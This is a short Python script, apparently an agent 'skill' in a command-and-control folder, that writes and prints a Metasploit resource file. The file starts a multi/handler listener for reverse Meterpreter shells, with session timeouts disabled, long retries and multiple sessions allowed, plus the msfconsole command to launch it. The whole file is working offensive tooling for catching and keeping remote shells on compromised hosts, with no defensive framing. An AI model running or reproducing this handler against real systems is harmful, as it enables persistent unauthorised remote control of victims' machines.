#!/usr/bin/env python3
"""Generate a Metasploit multi/handler resource script.

Usage:
  python skills/c2/scripts/msf_handler.py --payload windows/x64/meterpreter/reverse_tcp --lhost 10.0.0.5 --lport 4444 --output handler.rc
"""

from __future__ import annotations

import argparse
import json
from pathlib import Path


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Generate Metasploit handler resource file."
    )
    parser.add_argument("--payload", required=True)
    parser.add_argument("--lhost", required=True)
    parser.add_argument("--lport", type=int, required=True)
    parser.add_argument("--sessions-limit", type=int, default=10)
    parser.add_argument("--output", required=True, help="Path to .rc file")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    rc_path = Path(args.output).resolve()
    rc_path.parent.mkdir(parents=True, exist_ok=True)

    content = "\n".join(
        [
            "use exploit/multi/handler",
            f"set PAYLOAD {args.payload}",
            f"set LHOST {args.lhost}",
            f"set LPORT {args.lport}",
            f"set ExitOnSession false",
            f"set SessionCommunicationTimeout 0",
            f"set SessionExpirationTimeout 0",
            f"set SessionRetryTotal 3600",
            f"set SessionRetryWait 10",
            f"set ReverseListenerThreaded true",
            f"set SessionMax {args.sessions_limit}",
            "run -j",
            "",
        ]
    )
    rc_path.write_text(content, encoding="utf-8")

    run_cmd = f"msfconsole -r {rc_path}"
    print(content)
    print(run_cmd)
    print(
        json.dumps(
            {
                "rc_file": str(rc_path),
                "run_command": run_cmd,
            },
            indent=2,
            ensure_ascii=False,
        )
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
